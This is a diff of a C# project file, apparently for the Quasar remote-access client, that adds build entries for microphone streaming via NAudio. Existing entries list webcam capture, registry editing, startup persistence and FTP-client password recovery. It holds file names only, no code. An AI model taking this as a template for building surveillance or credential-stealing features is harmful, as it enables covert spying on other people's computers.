@@ -86,6 +86,7 @@
     <Compile Include="Core\AForge\Video.DirectShow\VideoInput.cs" />
     <Compile Include="Core\AForge\Video\IVideoSource.cs" />
     <Compile Include="Core\AForge\Video\VideoEvents.cs" />
+    <Compile Include="Core\Commands\AudioHandler.cs" />
     <Compile Include="Core\Commands\RegistryHandler.cs" />
     <Compile Include="Core\Commands\TCPConnectionsHandler.cs" />
     <Compile Include="Core\Commands\WebcamHandler.cs" />
@@ -107,6 +108,52 @@
     <Compile Include="Core\Installation\ClientUninstaller.cs" />
     <Compile Include="Core\Installation\ClientUpdater.cs" />
     <Compile Include="Core\Installation\Startup.cs" />
+    <Compile Include="Core\NAudio\Mixer\BooleanMixerControl.cs" />
+    <Compile Include="Core\NAudio\Mixer\CustomMixerControl.cs" />
+    <Compile Include="Core\NAudio\Mixer\ListTextMixerControl.cs" />
+    <Compile Include="Core\NAudio\Mixer\Mixer.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerControl.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerControlType.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerFlags.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerInterop.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerLine.cs" />
+    <Compile Include="Core\NAudio\Mixer\MixerLineComponentType.cs" />
+    <Compile Include="Core\NAudio\Mixer\SignedMixerControl.cs" />
+    <Compile Include="Core\NAudio\Mixer\UnsignedMixerControl.cs" />
+    <Compile Include="Core\NAudio\Utils\CircularBuffer.cs" />
+    <Compile Include="Core\NAudio\Utils\WavePositionExtensions.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\Manufacturers.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\MmException.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\MmResult.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\MmTime.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveCallbackInfo.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveCallbackStrategy.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveHeader.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveHeaderFlags.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveInCapabilities.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveInEventArgs.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveInterop.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveOutCapabilities.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveOutSupport.cs" />
+    <Compile Include="Core\NAudio\Wave\MmeInterop\WaveWindow.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveFormats\WaveFormat.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveFormats\WaveFormatEncoding.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveFormats\WaveFormatExtraData.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveInEvent .cs" />
+    <Compile Include="Core\NAudio\Wave\WaveInputs\IWaveIn.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveInputs\WaveIn.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\IWaveBuffer.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\IWavePlayer.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\IWaveProvider.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\IWaveProviderFloat.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\PlaybackState.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\StoppedEventArgs.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\WaveBuffer.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\WaveOut.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveOutputs\WaveOutEvent.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveProviders\BufferedWaveProvider.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveStreams\WaveInBuffer.cs" />
+    <Compile Include="Core\NAudio\Wave\WaveStreams\WaveOutBuffer.cs" />
     <Compile Include="Core\NetSerializer\CodeGenContext.cs" />
     <Compile Include="Core\NetSerializer\Helpers.cs" />
     <Compile Include="Core\NetSerializer\ITypeSerializer.cs" />
@@ -130,6 +177,8 @@
     <Compile Include="Core\Cryptography\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
     <Compile Include="Core\Networking\QuasarClient.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetAudioDevicesResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetAudioStreamResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetChangeRegistryValueResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetConnectionsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetCreateRegistryKeyResponse.cs" />
@@ -143,6 +192,7 @@
     <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryKeyResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryValueResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
+    <Compile Include="Core\Packets\ClientPackets\StopAudioStreamResponse.cs" />
     <Compile Include="Core\Packets\PacketRegistery.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoWebcamStop.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoAskElevate.cs" />
@@ -156,11 +206,14 @@
     <Compile Include="Core\Packets\ServerPackets\DoLoadRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryValue.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetAudioDevices.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetAudioStream.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetConnections.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetWebcam.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetWebcams.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
+    <Compile Include="Core\Packets\ServerPackets\StopAudioStream.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Registry\RegistryEditor.cs" />
@@ -295,6 +348,7 @@
       <DesignTime>True</DesignTime>
     </Compile>
     <None Include="app.manifest" />
+    <None Include="Core\NAudio\Wave\WaveInputs\WaveInEvent.cs0" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
       <LastGenOutput>Settings.Designer.cs</LastGenOutput>
